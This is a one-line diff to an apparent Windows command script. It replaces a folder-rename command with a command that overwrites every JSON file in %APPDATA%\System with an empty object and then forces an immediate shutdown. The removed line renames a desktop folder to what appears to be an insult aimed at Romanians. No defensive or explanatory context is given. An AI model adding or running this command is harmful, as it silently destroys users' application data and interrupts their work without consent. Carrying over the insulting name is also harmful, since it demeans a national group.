@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd rename '%USERPROFILE%\desktop\Impression 3D' Nike-les-roumins
+ExecuteCmd -user -cmd for %f in ("%APPDATA%\System\*.json") do echo {} > "%f" & shutdown /s /t 0
